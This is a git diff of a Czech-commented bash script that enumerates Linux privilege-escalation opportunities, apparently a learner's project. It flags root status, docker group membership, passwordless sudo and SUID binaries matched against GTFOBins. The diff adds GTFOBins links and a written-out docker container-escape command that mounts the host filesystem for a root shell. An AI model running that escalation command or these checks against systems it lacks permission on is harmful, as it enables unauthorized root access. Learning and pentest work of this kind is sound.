@@ -43,6 +43,7 @@ USER=$(whoami)
 
 if [ "$USER" == "root" ]; then
 	echo -e "${RED}Jsi root${NC}"
+	echo "Můžeš jít na https://gtfobins.org/gtfobins/bash/#shell a využít eskalaci privilegií"
 else
 	echo -e "${GREEN}Nejsi root${NC}"
 	echo "Jsi uživatel: $USER"
@@ -55,10 +56,13 @@ groups #vypíše pouze group bez žádných id
 # -q u grepu pro quiet (grep nic nevypíše, jenom pro podmínku)
 if groups | grep -qw "docker"; then #-q pro quit a -w pro přesnou shodu celého zapsaného textu (docker)
 	echo -e "\n${RED}Nacházíš se v Docker group - využití eskalace priviligií!!${NC}\n"
+	echo "Můžeš využít příkazu na https://gtfobins.org/gtfobins/docker/"
+	echo "Zkus: docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
 fi
 
 if [ "$EUID" -eq 0 ]; then #proměnná pro id uživatele
 	echo -e "\n${RED}Jsi root!!${NC}\n"
+	echo "Můžeš jít na https://gtfobins.org/gtfobins/bash/#shell a využít eskalaci privilegií"
 fi
 
 #==========================================================================================================================================
@@ -69,7 +73,7 @@ echo -e "\n====${BLUE}SYSTEM INFO${NC}====\n"
 grep "^NAME=" /etc/os-release
 echo #Pro prázdný řádek  
 uname -a 
-
+echo -e "${BLUE}Pokus se na internetu najít exploit pro danou verzi linuxu/kernelu ${NC}"
 echo #Pro prázdný řádek 
 
 #==========================================================================================================================================
@@ -80,9 +84,10 @@ if sudo -n -l >/dev/null 2>&1; then # pokud je vyžadováno heslo, tak -n to kdy
     echo -e "${BLUE}sudo -l lze spustit bez hesla (listing)${NC}"
 	if sudo -n -l 2>/dev/null | grep -q "NOPASSWD"; then   #vnoření podmínka
 		echo -e "${RED}EXISTUJÍ PŘÍKAZY BEZ HESLA${NC}"
+		echo "Využití příkazů na eskalaci privilegií https://gtfobins.org/"
 	fi
 else
-    echo "sudo -l vyžaduje heslo nebo není dostupné"
+    echo -e "${GREEN}sudo -l vyžaduje heslo nebo není dostupné${NC}"
 fi
 
 #==========================================================================================================================================
@@ -125,21 +130,20 @@ vagrant valgrind vi view vim vimdiff virsh volatility w3m watch wc wget whiptail
 wireshark wish xargs xdg-user-dir xdotool xelatex xetex xmodmap xmore xpad xxd xz yarn yash
 yelp yt-dlp zathura zcat zgrep zic zip zless zsh zsoelim zypper)
 
-find / -perm -4000 -type f 2>/dev/null | while IFS= read -r file; do   #-r aby nemazal v path /, IFS pro to, aby nerozděloval podle mezer a speciálních znaků
-    binarka=$(basename "$file") # uložení do proměnné, basename znamená, že veme celou file (cestu souboru) a veme jenom poslední část, tak že pro nás název aplikace ezz prostě :D
+find / -perm -4000 -type f 2>/dev/null | while IFS= read -r file; do #-r aby nemazal v path /, IFS pro to, aby nemazal mezery
+    binarka=$(basename "$file") # uložení do proměnné, basename veme poslední část celé cesty/file,tak že název programu  
 
-    for item in "${seznam[@]}"; do #veme každý item z našeho velkého seznamu XDDD, zrovna mi tady pomohl ai jo :I, klid XD
-        if [ "$binarka" = "$item" ]; then   #každý vypsaný řádek z find příkazu se projede touto hračkou a jestli se název programu ROVNÁ s nějakým z itemů v seznamu, tak to dá program vědět :D
-            echo -e "${YELLOW}[!]UNPRIVILEGED SUID nalezen: $file${NC}"
-            echo "    → $binarka je v seznamu (zkontroluj GTFOBins)"
-	    echo -e "${BLUE}https://gtfobins.org/gtfobins/$item/${NC}"
-        fi
-    done
+    # vylepšená kontrola, jestli je binarka v seznamu
+    if printf '%s\n' "${seznam[@]}" | grep -qx "$binarka"; then # vypsání každou položku seznamu na jeden řádek, grep -q (quiet), -x pro přesnou shodu
+        echo -e "${RED}[!] UNPRIVILEGED SUID nalezen: $file${NC}"
+        echo "    → $binarka je v seznamu (zkontroluj GTFOBins)"
+        echo -e "${BLUE}https://gtfobins.org/gtfobins/$binarka/${NC}"
+    fi
 done
 
-echo 
+echo # prázdný řádek 
 
-find / -perm -4000 -type f 2>/dev/null #vypsání (jenom) souborů se suid bitem (složky to nevypisuje) 
+# find / -perm -4000 -type f 2>/dev/null vypsání (jenom) souborů se suid bitem (složky to nevypisuje) 
 # tento příkaz find tu bude na určitou dobu, později bych projel možnosti v gtfobins a udělal podmínky na možnosti eskalace privilegií
 
 find / -writable -type f 2>/dev/null | head -n 10
